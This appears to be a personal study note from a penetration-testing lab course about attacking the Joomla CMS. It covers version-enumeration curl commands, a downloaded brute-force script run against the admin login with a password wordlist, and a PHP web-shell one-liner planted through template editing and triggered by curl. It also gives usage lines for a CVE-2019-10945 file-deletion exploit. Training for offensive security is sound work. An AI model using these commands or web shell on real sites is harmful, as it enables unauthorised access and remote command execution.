---
aliases:
tags:
source:
  - https://www.joomla.org/
desc:
---

Joomla is a free and open-source content management system (CMS) used to build and manage websites. It’s similar in purpose to WordPress or Drupal.

- Joomla collects some anonymous [usage statistics](https://developer.joomla.org/about/stats.html) such as the breakdown of Joomla, PHP and database versions and server operating systems in use on Joomla installations. 
- This data can be queried via their public [API](https://developer.joomla.org/about/stats/api.html).
	- `curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool`
- admin login portal  `http://dev.inlanefreight.local/administrator/index.php`
- default admin user is `admin`
- password is set at install time


# enumerate
- check the page source
	- `curl -s http://dev.inlanefreight.local/ | grep Joomla`
- check `/robots.txt` 
	- `curl -s http://dev.inlanefreight.local/robots.txt | grep Joomla`
- look for `/readme.txt`
	- `curl -s http://dev.inlanefreight.local/README.txt | head -n 5`
- may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`
	- `curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -`
- get approximate version via `/plugins/system/cache/cache.xml`
	- ``curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml
- [[droopescan]]
- [[JoomlaScan]]


# attack
- brute force
	- [joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce)
	- `curl https://raw.githubusercontent.com/ajnik/joomla-bruteforce/refs/heads/master/joomla-brute.py -o joomla-brute.py`
	- `chmod +x joomla-brute.py`
	- `sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/wordlists/rockyou.txt -usr "admin" -v`
- remote command execution
	- Configuration -> Template -> select template -> Customize
	  ![[joomla_admin-20251114105414624.png]]
		- add a php one liner
			- `system($_GET[0]);` #shell/php`
		- execute
			- `curl -s http://dev.inlanefreight.local/templates/protostar/error.php?0=id`

# exploits

## # Joomla! Core 1.5.0 - 3.9.4 - Directory Traversal / Authenticated Arbitrary File Deletion

- [[Joomla! Core 1.5.0 - 3.9.4 - Directory Traversal  Authenticated Arbitrary File Deletion]]
- python2.7 version - UNTESTED
	- usage `python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /`
- [python 3 version](https://github.com/dpgg101/CVE-2019-10945)
	- usage `python3 CVE-2019-10945.py --url http://dev.inlanefreight.local/administrator/ --username admin --password admin --dir /`
- 